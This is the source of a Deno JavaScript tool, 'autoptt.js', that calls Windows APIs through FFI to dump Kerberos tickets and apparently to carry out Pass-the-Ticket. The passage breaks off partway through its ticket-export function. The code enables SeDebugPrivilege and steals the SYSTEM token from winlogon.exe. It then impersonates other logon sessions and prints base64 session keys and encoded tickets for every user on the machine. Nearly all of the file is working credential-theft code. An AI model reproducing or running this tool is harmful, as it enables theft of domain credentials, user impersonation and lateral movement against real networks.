#!/usr/bin/env -S deno run --allow-ffi --allow-read --allow-write --allow-env

// autoptt.js — Kerberos ticket enumerator & Pass-the-Ticket (Deno, zero deps)

// ── Constants ──────────────────────────────────────────────────────────────────

const TOKEN_QUERY = 0x0008;
const TOKEN_ADJUST_PRIVILEGES = 0x0020;
const TOKEN_DUPLICATE = 0x0002;
const TOKEN_STATISTICS_INFO_CLASS = 10;
const SE_PRIVILEGE_ENABLED = 0x00000002;
const SE_DEBUG_NAME = 'SeDebugPrivilege';
const SecurityImpersonation = 2;
const PROCESS_QUERY_INFORMATION = 0x0400;
const TH32CS_SNAPPROCESS = 0x00000002;
const KerbQueryTicketCacheMessage = 1;
const KerbRetrieveEncodedTicketMessage = 8;
const KerbQueryTicketCacheExMessage = 14;
const KerbSubmitTicketMessage = 21;
const KERB_RETRIEVE_TICKET_AS_KERB_CRED = 0x8;
const MAXIMUM_ALLOWED = 0x02000000;
const TokenImpersonation = 2;

const LOGON_TYPE_NAMES = {
    0: 'Unknown', 2: 'Interactive', 3: 'Network', 4: 'Batch', 5: 'Service',
    7: 'Unlock', 8: 'NetworkCleartext', 9: 'NewCredentials', 10: 'RemoteInteractive', 11: 'CachedInteractive'
};

const ENCRYPTION_TYPES = {
    1: 'DES-CBC-CRC', 3: 'DES-CBC-MD5', 17: 'AES-128-CTS-HMAC-SHA1-96',
    18: 'AES-256-CTS-HMAC-SHA1-96', 23: 'RC4-HMAC', 24: 'RC4-HMAC-EXP'
};

let g_tgt_list = [];

// ── Struct sizes & offsets (x64 natural alignment) ───────────────────────────

const SZ_LUID = 8;
const SZ_LSA_US = 16;

const SZ_TOKEN_STATS = 56;
const TS_AuthId = 8;

const SZ_CACHE_REQ = 12;
const SZ_CACHE_RESP = 8;

const SZ_TCI = 64;
const TCI_ServerName = 0;
const TCI_RealmName = 16;
const TCI_StartTime = 32;
const TCI_EndTime = 40;
const TCI_RenewTime = 48;
const TCI_EncType = 56;
const TCI_Flags = 60;

const SZ_TCI_EX = 96;
const TCIE_ClientName = 0;
const TCIE_ClientRealm = 16;
const TCIE_ServerName = 32;
const TCIE_ServerRealm = 48;
const TCIE_StartTime = 64;
const TCIE_EndTime = 72;
const TCIE_RenewTime = 80;
const TCIE_EncType = 88;
const TCIE_Flags = 92;

const SZ_PE32W = 568;
const PE32_dwSize = 0;
const PE32_PID = 8;
const PE32_szExe = 44;

const SZ_TOKEN_PRIV = 16;

const SZ_RETRIEVE_REQ = 64;

const SZ_SUBMIT_REQ = 36;

const SLSD_LogonId = 4;
const SLSD_UserName = 16;
const SLSD_LogonDomain = 32;
const SLSD_AuthPackage = 48;
const SLSD_LogonType = 64;
const SLSD_Session = 68;
const SLSD_LogonTime = 80;
const SLSD_LogonServer = 88;
const SLSD_DnsDomain = 104;
const SLSD_Upn = 120;

const KET_SessionKey_KeyType = 72;
const KET_SessionKey_Length = 76;
const KET_SessionKey_Value = 80;
const KET_EncodedTicketSize = 136;
const KET_EncodedTicket = 144;

// ── Pointer / buffer helpers ─────────────────────────────────────────────────

const ptrOf = Deno.UnsafePointer.of;

function readPtr(buf, off = 0) {
    const v = new DataView(buf.buffer, buf.byteOffset).getBigUint64(off, true);
    return v === 0n ? null : Deno.UnsafePointer.create(v);
}
function ptrVal(p) { return p ? BigInt(Deno.UnsafePointer.value(p)) : 0n; }
function ptrAdd(p, n) { return Deno.UnsafePointer.create(ptrVal(p) + BigInt(n)); }

function putU8(b, o, v)  { b[o] = v; }
function putU16(b, o, v) { new DataView(b.buffer, b.byteOffset).setUint16(o, v, true); }
function putU32(b, o, v) { new DataView(b.buffer, b.byteOffset).setUint32(o, v, true); }
function putI32(b, o, v) { new DataView(b.buffer, b.byteOffset).setInt32(o, v, true); }
function putU64(b, o, v) { new DataView(b.buffer, b.byteOffset).setBigUint64(o, v, true); }
function getU16(b, o) { return new DataView(b.buffer, b.byteOffset).getUint16(o, true); }
function getU32(b, o) { return new DataView(b.buffer, b.byteOffset).getUint32(o, true); }
function getI32(b, o) { return new DataView(b.buffer, b.byteOffset).getInt32(o, true); }

function encodeUtf16(str) {
    const buf = new Uint8Array((str.length + 1) * 2);
    const dv = new DataView(buf.buffer);
    for (let i = 0; i < str.length; i++) dv.setUint16(i * 2, str.charCodeAt(i), true);
    return buf;
}

function readLsaUS(ptr, offset) {
    const view = new Deno.UnsafePointerView(ptr);
    const length = view.getUint16(offset);
    if (length === 0) return '';
    const bufPtr = view.getPointer(offset + 8);
    if (!bufPtr) return '';
    const bv = new Deno.UnsafePointerView(bufPtr);
    const chars = [];
    for (let i = 0; i < length; i += 2) chars.push(String.fromCharCode(bv.getUint16(i)));
    return chars.join('');
}

function readWcharBuf(buf, offset, maxChars) {
    const dv = new DataView(buf.buffer, buf.byteOffset);
    let s = '';
    for (let i = 0; i < maxChars; i++) {
        const ch = dv.getUint16(offset + i * 2, true);
        if (ch === 0) break;
        s += String.fromCharCode(ch);
    }
    return s;
}

function copyFromPtr(ptr, size) {
    const out = new Uint8Array(size);
    new Deno.UnsafePointerView(ptr).copyInto(out);
    return out;
}

function toBase64(bytes) {
    const chunks = [];
    for (let i = 0; i < bytes.length; i += 8192) {
        chunks.push(String.fromCharCode(...bytes.subarray(i, Math.min(i + 8192, bytes.length))));
    }
    return btoa(chunks.join(''));
}

// ── Date / formatting helpers ────────────────────────────────────────────────

function filetimeToDate(quad) {
    if (quad === 0n) return new Date(Date.UTC(1601, 0, 1));
    try {
        const ms = quad / 10000n - 11644473600000n;
        return new Date(Number(ms));
    } catch { return new Date(Date.UTC(1601, 0, 1)); }
}

function formatDate(d) {
    const mm = String(d.getMonth() + 1).padStart(2, '0');
    const dd = String(d.getDate()).padStart(2, '0');
    const yyyy = d.getFullYear();
    const hh = String(d.getHours()).padStart(2, '0');
    const mi = String(d.getMinutes()).padStart(2, '0');
    const ss = String(d.getSeconds()).padStart(2, '0');
    return `${mm}/${dd}/${yyyy} ${hh}:${mi}:${ss}`;
}

function formatTicketFlags(flags) {
    const names = [];
    if (flags & 0x40000000) names.push('forwardable');
    if (flags & 0x20000000) names.push('forwarded');
    if (flags & 0x10000000) names.push('proxiable');
    if (flags & 0x08000000) names.push('proxy');
    if (flags & 0x04000000) names.push('may_postdate');
    if (flags & 0x02000000) names.push('postdated');
    if (flags & 0x01000000) names.push('invalid');
    if (flags & 0x00800000) names.push('renewable');
    if (flags & 0x00400000) names.push('initial');
    if (flags & 0x00200000) names.push('pre_authent');
    if (flags & 0x00100000) names.push('hw_authent');
    if (flags & 0x00040000) names.push('ok_as_delegate');
    if (flags & 0x00010000) names.push('name_canonicalize');
    return names.length ? names.join(' ') : '0';
}

function padRight(str, len) { return str.length >= len ? str : str + ' '.repeat(len - str.length); }
function padLeft(str, len) { return str.length >= len ? str : ' '.repeat(len - str.length) + str; }
function hexDword(n) { return (n >>> 0).toString(16); }
function hex8(n) { return (n >>> 0).toString(16).padStart(8, '0').toUpperCase(); }

function fileExists(path) {
    try { Deno.statSync(path); return true; } catch { return false; }
}

// ── DLL loading ──────────────────────────────────────────────────────────────

let secur32, advapi32, kernel32, shell32;
try {
    secur32 = Deno.dlopen('secur32.dll', {
        LsaConnectUntrusted:           { parameters: ["buffer"], result: "i32" },
        LsaLookupAuthenticationPackage:{ parameters: ["pointer", "buffer", "buffer"], result: "i32" },
        LsaCallAuthenticationPackage:  { parameters: ["pointer", "u32", "buffer", "u32", "buffer", "buffer", "buffer"], result: "i32" },
        LsaFreeReturnBuffer:           { parameters: ["pointer"], result: "i32" },
        LsaEnumerateLogonSessions:     { parameters: ["buffer", "buffer"], result: "i32" },
        LsaGetLogonSessionData:        { parameters: ["pointer", "buffer"], result: "i32" },
        LsaDeregisterLogonProcess:     { parameters: ["pointer"], result: "i32" },
    });
    advapi32 = Deno.dlopen('advapi32.dll', {
        OpenProcessToken:       { parameters: ["pointer", "u32", "buffer"], result: "i32" },
        GetTokenInformation:    { parameters: ["pointer", "u32", "buffer", "u32", "buffer"], result: "i32" },
        LookupPrivilegeValueW:  { parameters: ["pointer", "buffer", "buffer"], result: "i32" },
        AdjustTokenPrivileges:  { parameters: ["pointer", "i32", "buffer", "u32", "pointer", "pointer"], result: "i32" },
        DuplicateToken:         { parameters: ["pointer", "u32", "buffer"], result: "i32" },
        DuplicateTokenEx:       { parameters: ["pointer", "u32", "pointer", "u32", "u32", "buffer"], result: "i32" },
        ImpersonateLoggedOnUser:{ parameters: ["pointer"], result: "i32" },
        RevertToSelf:           { parameters: [], result: "i32" },
    });
    kernel32 = Deno.dlopen('kernel32.dll', {
        GetCurrentProcess:        { parameters: [], result: "pointer" },
        CloseHandle:              { parameters: ["pointer"], result: "i32" },
        GetLastError:             { parameters: [], result: "u32" },
        OpenProcess:              { parameters: ["u32", "i32", "u32"], result: "pointer" },
        CreateToolhelp32Snapshot: { parameters: ["u32", "u32"], result: "pointer" },
        Process32FirstW:          { parameters: ["pointer", "buffer"], result: "i32" },
        Process32NextW:           { parameters: ["pointer", "buffer"], result: "i32" },
    });
    shell32 = Deno.dlopen('shell32.dll', {
        IsUserAnAdmin: { parameters: [], result: "i32" },
    });
} catch (e) {
    console.log(`[-] Failed to load DLLs: ${e.message}`);
    Deno.exit(1);
}

const S = secur32.symbols;
const A = advapi32.symbols;
const K = kernel32.symbols;

// ── Core functions ───────────────────────────────────────────────────────────

function enableDebugPrivilege() {
    const hProcess = K.GetCurrentProcess();
    const hTokenBuf = new Uint8Array(8);
    if (!A.OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, hTokenBuf)) return false;
    const hToken = readPtr(hTokenBuf);

    const luidBuf = new Uint8Array(8);
    const privName = encodeUtf16(SE_DEBUG_NAME);
    if (!A.LookupPrivilegeValueW(null, privName, luidBuf)) {
        K.CloseHandle(hToken);
        return false;
    }

    const tp = new Uint8Array(SZ_TOKEN_PRIV);
    putU32(tp, 0, 1);
    tp.set(luidBuf, 4);
    putU32(tp, 12, SE_PRIVILEGE_ENABLED);

    if (!A.AdjustTokenPrivileges(hToken, 0, tp, 0, null, null)) {
        K.CloseHandle(hToken);
        return false;
    }
    const error = K.GetLastError();
    K.CloseHandle(hToken);
    if (error === 1300) return false;
    console.log('[+] SeDebugPrivilege enabled successfully');
    return true;
}

function getCurrentLogonId() {
    const hProcess = K.GetCurrentProcess();
    const hTokenBuf = new Uint8Array(8);
    if (!A.OpenProcessToken(hProcess, TOKEN_QUERY, hTokenBuf)) return null;
    const hToken = readPtr(hTokenBuf);

    const statsBuf = new Uint8Array(SZ_TOKEN_STATS);
    const retLen = new Uint8Array(4);
    if (!A.GetTokenInformation(hToken, TOKEN_STATISTICS_INFO_CLASS, statsBuf, SZ_TOKEN_STATS, retLen)) {
        K.CloseHandle(hToken);
        return null;
    }
    K.CloseHandle(hToken);
    return { low: getU32(statsBuf, TS_AuthId), high: getI32(statsBuf, TS_AuthId + 4) };
}

function printCurrentLogonId() {
    const logonId = getCurrentLogonId();
    if (logonId) console.log(`Current LogonId is ${logonId.high}:0x${hexDword(logonId.low)}`);
}

function getProcessIdOfName(processName) {
    const hSnapshot = K.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!hSnapshot) return 0;

    const pe = new Uint8Array(SZ_PE32W);
    putU32(pe, PE32_dwSize, SZ_PE32W);

    if (!K.Process32FirstW(hSnapshot, pe)) {
        K.CloseHandle(hSnapshot);
        return 0;
    }
    do {
        const exeName = readWcharBuf(pe, PE32_szExe, 260);
        if (exeName.toLowerCase() === processName.toLowerCase()) {
            const pid = getU32(pe, PE32_PID);
            K.CloseHandle(hSnapshot);
            return pid;
        }
    } while (K.Process32NextW(hSnapshot, pe));

    K.CloseHandle(hSnapshot);
    return 0;
}

function getSystem() {
    const winlogonPid = getProcessIdOfName('winlogon.exe');
    if (winlogonPid === 0) return false;

    const hProcess = K.OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPid);
    if (!hProcess) return false;

    const hTokenBuf = new Uint8Array(8);
    if (!A.OpenProcessToken(hProcess, TOKEN_DUPLICATE, hTokenBuf)) {
        K.CloseHandle(hProcess);
        return false;
    }
    const hToken = readPtr(hTokenBuf);

    const hDupBuf = new Uint8Array(8);
    if (!A.DuplicateToken(hToken, SecurityImpersonation, hDupBuf)) {
        K.CloseHandle(hToken);
        K.CloseHandle(hProcess);
        return false;
    }
    const hDup = readPtr(hDupBuf);

    if (!A.ImpersonateLoggedOnUser(hDup)) {
        K.CloseHandle(hDup);
        K.CloseHandle(hToken);
        K.CloseHandle(hProcess);
        return false;
    }

    K.CloseHandle(hToken);
    K.CloseHandle(hDup);
    K.CloseHandle(hProcess);
    return true;
}

function getLsaHandleWithImpersonation() {
    const isAdmin = shell32.symbols.IsUserAnAdmin();
    if (isAdmin) {
        if (!getSystem()) return null;
        const hBuf = new Uint8Array(8);
        const status = S.LsaConnectUntrusted(hBuf);
        A.RevertToSelf();
        if (status !== 0) return null;
        return readPtr(hBuf);
    } else {
        const hBuf = new Uint8Array(8);
        const status = S.LsaConnectUntrusted(hBuf);
        if (status !== 0) return null;
        return readPtr(hBuf);
    }
}

function impersonateSession(targetLogonId) {
    const hSnapshot = K.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!hSnapshot) return null;

    const pe = new Uint8Array(SZ_PE32W);
    putU32(pe, PE32_dwSize, SZ_PE32W);

    if (!K.Process32FirstW(hSnapshot, pe)) {
        K.CloseHandle(hSnapshot);
        return null;
    }

    do {
        const pid = getU32(pe, PE32_PID);
        const hProcess = K.OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
        if (hProcess) {
            const hTokenBuf = new Uint8Array(8);
            if (A.OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, hTokenBuf)) {
                const hToken = readPtr(hTokenBuf);
                const statsBuf = new Uint8Array(SZ_TOKEN_STATS);
                const retLen = new Uint8Array(4);
                if (A.GetTokenInformation(hToken, TOKEN_STATISTICS_INFO_CLASS, statsBuf, SZ_TOKEN_STATS, retLen)) {
                    const authLow = getU32(statsBuf, TS_AuthId);
                    if (authLow === targetLogonId) {
                        const hImpBuf = new Uint8Array(8);
                        if (A.DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, null, SecurityImpersonation, TokenImpersonation, hImpBuf)) {
                            K.CloseHandle(hToken);
                            K.CloseHandle(hProcess);
                            K.CloseHandle(hSnapshot);
                            return readPtr(hImpBuf);
                        }
                    }
                }
                K.CloseHandle(hToken);
            }
            K.CloseHandle(hProcess);
        }
    } while (K.Process32NextW(hSnapshot, pe));

    K.CloseHandle(hSnapshot);
    return null;
}

function lookupKerberosPackage(lsaHandle) {
    const pkgStr = new TextEncoder().encode('Kerberos\0');
    const lsaString = new Uint8Array(SZ_LSA_US);
    putU16(lsaString, 0, 8);
    putU16(lsaString, 2, 9);
    putU64(lsaString, 8, ptrVal(ptrOf(pkgStr)));

    const authPack = new Uint8Array(4);
    const status = S.LsaLookupAuthenticationPackage(lsaHandle, lsaString, authPack);
    if (status !== 0) return null;
    return getU32(authPack, 0);
}

function buildCacheReq(messageType, luidLow, luidHigh) {
    const buf = new Uint8Array(SZ_CACHE_REQ);
    putU32(buf, 0, messageType);
    putU32(buf, 4, luidLow);
    putI32(buf, 8, luidHigh);
    return buf;
}

function requestServiceTicket(lsaHandle, authPack, userLogonId, targetName, ticketFlags) {
    try {
        const targetUtf16 = encodeUtf16(targetName);
        const targetByteLen = targetName.length * 2;

        const totalSize = SZ_RETRIEVE_REQ + targetUtf16.length;
        const req = new Uint8Array(totalSize);

        putU32(req, 0, KerbRetrieveEncodedTicketMessage);
        putU32(req, 4, userLogonId.low);
        putI32(req, 8, userLogonId.high);
        putU16(req, 16, targetByteLen);
        putU16(req, 18, targetByteLen + 2);
        putU32(req, 32, ticketFlags);
        putU32(req, 36, KERB_RETRIEVE_TICKET_AS_KERB_CRED);
        putI32(req, 40, 0);
        req.set(targetUtf16, SZ_RETRIEVE_REQ);

        // TargetName.Buffer (offset 24) must point to the string data appended after the struct
        const reqBasePtr = ptrOf(req);
        putU64(req, 24, ptrVal(reqBasePtr) + BigInt(SZ_RETRIEVE_REQ));

        const rpBuf = new Uint8Array(8);
        const rsBuf = new Uint8Array(4);
        const psBuf = new Uint8Array(4);

        const status = S.LsaCallAuthenticationPackage(
            lsaHandle, authPack, req, totalSize, rpBuf, rsBuf, psBuf
        );

        const responseSize = getU32(rsBuf, 0);
        const protocolStatus = getI32(psBuf, 0);

        if (status !== 0 || protocolStatus !== 0 || responseSize === 0) {
            return { ticketBytes: null, sessionKeyBytes: null, keyType: 0 };
        }

        const respPtr = readPtr(rpBuf);
        if (!respPtr) return { ticketBytes: null, sessionKeyBytes: null, keyType: 0 };

        const rv = new Deno.UnsafePointerView(respPtr);
        let ticketBytes = null, sessionKeyBytes = null, keyType = 0;

        const encodedSize = rv.getInt32(KET_EncodedTicketSize);
        if (encodedSize > 0) {
            const encPtr = rv.getPointer(KET_EncodedTicket);
            if (encPtr) ticketBytes = copyFromPtr(encPtr, encodedSize);
        }

        const skLen = rv.getUint32(KET_SessionKey_Length);
        if (skLen > 0) {
            const skPtr = rv.getPointer(KET_SessionKey_Value);
            if (skPtr) {
                sessionKeyBytes = copyFromPtr(skPtr, skLen);
                keyType = rv.getInt32(KET_SessionKey_KeyType);
            }
        }

        S.LsaFreeReturnBuffer(respPtr);
        return { ticketBytes, sessionKeyBytes, keyType };
    } catch {
        return { ticketBytes: null, sessionKeyBytes: null, keyType: 0 };
    }
}

function addTgtToList(logonId, username, domain, serviceName) {
    for (const tgt of g_tgt_list) {
        if (tgt.logon_id === logonId && tgt.service_name === serviceName) return;
    }
    g_tgt_list.push({
        logon_id: logonId,
        username: username || '(unknown)',
        domain: domain || '(unknown)',
        service_name: serviceName || '(unknown)'
    });
}

// ── Commands ─────────────────────────────────────────────────────────────────

function enumerateLogonSessions() {
    const countBuf = new Uint8Array(4);
    const listBuf = new Uint8Array(8);
    const status = S.LsaEnumerateLogonSessions(countBuf, listBuf);
    if (status !== 0) {
        console.log(`[-] LsaEnumerateLogonSessions failed with status 0x${hex8(status)}`);
        return;
    }
    const count = getU32(countBuf, 0);
    const listPtr = readPtr(listBuf);
    console.log();

    for (let i = 0; i < count; i++) {
        const luidPtr = ptrAdd(listPtr, i * SZ_LUID);
        const lv = new Deno.UnsafePointerView(luidPtr);
        const low = lv.getUint32(0);
        const high = lv.getInt32(4);

        const sdBuf = new Uint8Array(8);
        if (S.LsaGetLogonSessionData(luidPtr, sdBuf) !== 0) continue;
        const sdPtr = readPtr(sdBuf);
        if (!sdPtr) continue;

        const domain = readLsaUS(sdPtr, SLSD_LogonDomain);
        const username = readLsaUS(sdPtr, SLSD_UserName);
        const authPackage = readLsaUS(sdPtr, SLSD_AuthPackage);
        const sv = new Deno.UnsafePointerView(sdPtr);
        const logonType = sv.getUint32(SLSD_LogonType);
        const session = sv.getUint32(SLSD_Session);
        const logonTypeStr = LOGON_TYPE_NAMES[logonType] || `(${logonType})`;

        console.log(`[${i}] Session ${session} ${high}:0x${hexDword(low)} ${domain}\\${username} ${authPackage}:${logonTypeStr}`);
        S.LsaFreeReturnBuffer(sdPtr);
    }
    S.LsaFreeReturnBuffer(listPtr);
}

function enumerateMyTickets() {
    const hBuf = new Uint8Array(8);
    let status = S.LsaConnectUntrusted(hBuf);
    if (status !== 0) { console.log(`[-] LsaConnectUntrusted failed: 0x${hex8(status)}`); return; }
    const lsaHandle = readPtr(hBuf);

    const authPack = lookupKerberosPackage(lsaHandle);
    if (authPack === null) { console.log('[-] Failed to find Kerberos package'); S.LsaDeregisterLogonProcess(lsaHandle); return; }

    const cacheReq = buildCacheReq(KerbQueryTicketCacheMessage, 0, 0);
    const rpBuf = new Uint8Array(8), rsBuf = new Uint8Array(4), psBuf = new Uint8Array(4);

    status = S.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheReq, SZ_CACHE_REQ, rpBuf, rsBuf, psBuf);
    if (status !== 0 || getI32(psBuf, 0) !== 0 || !readPtr(rpBuf)) {
        console.log('[-] Failed to query ticket cache');
        S.LsaDeregisterLogonProcess(lsaHandle);
        return;
    }

    const respPtr = readPtr(rpBuf);
    const rv = new Deno.UnsafePointerView(respPtr);
    const ticketCount = rv.getUint32(4);
    console.log(`Cached Tickets: (${ticketCount})\n`);

    if (ticketCount === 0) {
        S.LsaFreeReturnBuffer(respPtr);
        S.LsaDeregisterLogonProcess(lsaHandle);
        return;
    }

    const logonId = getCurrentLogonId();
    let username = 'unknown';
    if (logonId) {
        const luidBuf = new Uint8Array(SZ_LUID);
        putU32(luidBuf, 0, logonId.low);
        putI32(luidBuf, 4, logonId.high);
        const sdBuf2 = new Uint8Array(8);
        if (S.LsaGetLogonSessionData(ptrOf(luidBuf), sdBuf2) === 0) {
            const sdPtr = readPtr(sdBuf2);
            if (sdPtr) {
                username = readLsaUS(sdPtr, SLSD_UserName);
                S.LsaFreeReturnBuffer(sdPtr);
            }
        }
    }

    try {
        for (let i = 0; i < ticketCount; i++) {
            const off = SZ_CACHE_RESP + i * SZ_TCI;
            const serverName = readLsaUS(respPtr, off + TCI_ServerName);
            const realmName = readLsaUS(respPtr, off + TCI_RealmName);
            const startTime = filetimeToDate(rv.getBigInt64(off + TCI_StartTime));
            const endTime = filetimeToDate(rv.getBigInt64(off + TCI_EndTime));
            const renewTime = filetimeToDate(rv.getBigInt64(off + TCI_RenewTime));
            const encTypeVal = rv.getInt32(off + TCI_EncType);
            const flagsVal = rv.getUint32(off + TCI_Flags);
            const encType = ENCRYPTION_TYPES[encTypeVal] || `Unknown (${encTypeVal})`;
            const flagsStr = formatTicketFlags(flagsVal);

            console.log(`#${i}>     Client: ${username} @ ${realmName}`);
            console.log(`        Server: ${serverName} @ ${realmName}`);
            console.log(`        KerbTicket Encryption Type: ${encType}`);
            console.log(`        Ticket Flags 0x${hexDword(flagsVal)} -> ${flagsStr}`);
            console.log(`        Start Time: ${formatDate(startTime)} (local)`);
            console.log(`        End Time:   ${formatDate(endTime)} (local)`);
            console.log(`        Renew Time: ${formatDate(renewTime)} (local)`);

            const svc = requestServiceTicket(lsaHandle, authPack, { low: 0, high: 0 }, serverName, flagsVal);
            if (svc.sessionKeyBytes) {
                const keyEncType = ENCRYPTION_TYPES[svc.keyType] || `Unknown (${svc.keyType})`;
                console.log(`        Session Key Type: ${keyEncType}`);
            }
            console.log('        Cache Flags: 0x1 -> PRIMARY');
            console.log('        Kdc Called:\n');
        }
    } catch { /* silently ignore like the Python version */ }

    S.LsaFreeReturnBuffer(respPtr);
    S.LsaDeregisterLogonProcess(lsaHandle);
}

function enumerateAllTickets(printTickets = true) {
    if (printTickets) console.log('[*] Action: Dump Kerberos Ticket Data (All Users)\n');

    const currentLuid = getCurrentLogonId();
    if (currentLuid && printTickets) {
        const combined = ((BigInt(currentLuid.high) << 32n) | BigInt(currentLuid.low >>> 0)) & 0xFFFFFFFFFFFFFFFFn;
        console.log(`[*] Current LUID    : 0x${combined.toString(16)}\n`);
    }

    if (printTickets) enableDebugPrivilege();

    const lsaHandle = getLsaHandleWithImpersonation();
    if (!lsaHandle) { console.log('[-] Failed to get LSA handle'); return; }

    const authPack = lookupKerberosPackage(lsaHandle);
    if (authPack === null) { S.LsaDeregisterLogonProcess(lsaHandle); return; }

    const countBuf = new Uint8Array(4), listBuf = new Uint8Array(8);
    let status = S.LsaEnumerateLogonSessions(countBuf, listBuf);
    if (status !== 0) { S.LsaDeregisterLogonProcess(lsaHandle); return; }
    const sessionCount = getU32(countBuf, 0);
    const sessionListPtr = readPtr(listBuf);

    g_tgt_list = [];
    let totalSessions = 0, sessionsWithTickets = 0, totalTickets = 0, tgtCount = 0, serviceCount = 0;

    for (let i = 0; i < sessionCount; i++) {
        const luidPtr = ptrAdd(sessionListPtr, i * SZ_LUID);
        const lv = new Deno.UnsafePointerView(luidPtr);
        const luidLow = lv.getUint32(0);
        const luidHigh = lv.getInt32(4);

        const sdBuf = new Uint8Array(8);
        status = S.LsaGetLogonSessionData(luidPtr, sdBuf);
        if (status !== 0) continue;
        const sdPtr = readPtr(sdBuf);
        if (!sdPtr) continue;

        const username = readLsaUS(sdPtr, SLSD_UserName);
        const domain = readLsaUS(sdPtr, SLSD_LogonDomain);

        if (!username) { S.LsaFreeReturnBuffer(sdPtr); continue; }
        totalSessions++;

        const cacheReq = buildCacheReq(KerbQueryTicketCacheExMessage, luidLow, luidHigh);
        const rpBuf = new Uint8Array(8), rsBuf = new Uint8Array(4), psBuf = new Uint8Array(4);
        status = S.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheReq, SZ_CACHE_REQ, rpBuf, rsBuf, psBuf);

        if (status !== 0 || getI32(psBuf, 0) !== 0 || !readPtr(rpBuf)) {
            S.LsaFreeReturnBuffer(sdPtr);
            continue;
        }

        const cacheRespPtr = readPtr(rpBuf);
        const crv = new Deno.UnsafePointerView(cacheRespPtr);
        const ticketCount = crv.getUint32(4);

        if (ticketCount === 0) {
            S.LsaFreeReturnBuffer(cacheRespPtr);
            S.LsaFreeReturnBuffer(sdPtr);
            continue;
        }

        sessionsWithTickets++;
        totalTickets += ticketCount;

        if (printTickets) {
            const authPackage = readLsaUS(sdPtr, SLSD_AuthPackage);
            const sv = new Deno.UnsafePointerView(sdPtr);
            const logonType = LOGON_TYPE_NAMES[sv.getUint32(SLSD_LogonType)] || 'Unknown';
            const logonTime = filetimeToDate(sv.getBigInt64(SLSD_LogonTime));
            const logonServer = readLsaUS(sdPtr, SLSD_LogonServer);
            const dnsDomain = readLsaUS(sdPtr, SLSD_DnsDomain);
            const upn = readLsaUS(sdPtr, SLSD_Upn);

            console.log(`  UserName                 : ${username}`);
            console.log(`  Domain                   : ${domain}`);
            console.log(`  LogonId                  : 0x${hexDword(luidLow)}`);
            console.log(`  UserSID                  : [SID]`);
            console.log(`  AuthenticationPackage    : ${authPackage}`);
            console.log(`  LogonType                : ${logonType}`);
            console.log(`  LogonTime                : ${formatDate(logonTime)}`);
            console.log(`  LogonServer              : ${logonServer}`);
            console.log(`  LogonServerDNSDomain     : ${dnsDomain}`);
            console.log(`  UserPrincipalName        : ${upn}`);
            console.log();
        }

        for (let j = 0; j < ticketCount; j++) {
            const off = SZ_CACHE_RESP + j * SZ_TCI_EX;
            const clientName = readLsaUS(cacheRespPtr, off + TCIE_ClientName);
            const clientRealm = readLsaUS(cacheRespPtr, off + TCIE_ClientRealm);
            const serverName = readLsaUS(cacheRespPtr, off + TCIE_ServerName);
            const serverRealm = readLsaUS(cacheRespPtr, off + TCIE_ServerRealm);
            const startTime = filetimeToDate(crv.getBigInt64(off + TCIE_StartTime));
            const endTime = filetimeToDate(crv.getBigInt64(off + TCIE_EndTime));
            const renewTime = filetimeToDate(crv.getBigInt64(off + TCIE_RenewTime));
            const flagsVal = crv.getUint32(off + TCIE_Flags);
            const flagsStr = formatTicketFlags(flagsVal);

            const isTgt = serverName.toLowerCase().includes('krbtgt');
            if (isTgt) { tgtCount++; addTgtToList(luidLow, username, domain, serverName); }
            else { serviceCount++; }

            if (printTickets) {
                console.log(`\n    ServiceName              :  ${serverName}`);
                console.log(`    ServiceRealm             :  ${serverRealm}`);
                console.log(`    UserName                 :  ${clientName}`);
                console.log(`    UserRealm                :  ${clientRealm}`);
                console.log(`    StartTime                :  ${formatDate(startTime)}`);
                console.log(`    EndTime                  :  ${formatDate(endTime)}`);
                console.log(`    RenewTill                :  ${formatDate(renewTime)}`);
                console.log(`    Flags                    :  ${flagsStr}`);

                const svc = requestServiceTicket(lsaHandle, authPack, { low: luidLow, high: luidHigh }, serverName, flagsVal);
                if (svc.sessionKeyBytes) {
                    console.log(`    Base64(key)              :  ${toBase64(svc.sessionKeyBytes)}`);
                } else {
                    console.log(`    Base64(key)              :  (not available)`);
                }
                console.log('    Base64EncodedTicket   :');
                if (svc.ticketBytes) {
                    console.log(`      ${toBase64(svc.ticketBytes)}`);
                } else {
                    console.log('      (failed to retrieve)');
                }
                console.log();
            }
        }

        S.LsaFreeReturnBuffer(cacheRespPtr);
        S.LsaFreeReturnBuffer(sdPtr);
    }

    if (printTickets) {
        console.log('='.repeat(80));
        console.log('  SUMMARY');
        console.log('='.repeat(80));
        console.log(`Total logon sessions analyzed: ${totalSessions}`);
        console.log(`Sessions with Kerberos tickets: ${sessionsWithTickets}`);
        console.log(`Total tickets found: ${totalTickets}`);
        console.log(`  - TGTs: ${tgtCount}`);
        console.log(`  - Service Tickets: ${serviceCount}`);
    }

    S.LsaFreeReturnBuffer(sessionListPtr);
    S.LsaDeregisterLogonProcess(lsaHandle);
}

function findTgtInCache(lsaHandle, authPack) {
    const cacheReq = buildCacheReq(KerbQueryTicketCacheMessage, 0, 0);
    const rpBuf = new Uint8Array(8), rsBuf = new Uint8Array(4), psBuf = new Uint8Array(4);
    const status = S.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheReq, SZ_CACHE_REQ, rpBuf, rsBuf, psBuf);

    if (status !== 0 || getI32(psBuf, 0) !== 0) return null;
    const respPtr = readPtr(rpBuf);
    if (!respPtr) return null;

    const rv = new Deno.UnsafePointerView(respPtr);
    const ticketCount = rv.getUint32(4);

    for (let i = 0; i < ticketCount; i++) {
        const off = SZ_CACHE_RESP + i * SZ_TCI;
        const serverName = readLsaUS(respPtr, off + TCI_ServerName);
        if (serverName.toLowerCase().includes('krbtgt')) {
            const flags = rv.getUint32(off + TCI_Flags);
            S.LsaFreeReturnBuffer(respPtr);
            return { serverName, flags };
        }
    }
    S.LsaFreeReturnBuffer(respPtr);
    return null;
}

function exportTicket(logonIdStr) {
    let targetLogonId;
    try { targetLogonId = parseInt(logonIdStr.replace(/^0x/i, ''), 16); } catch {
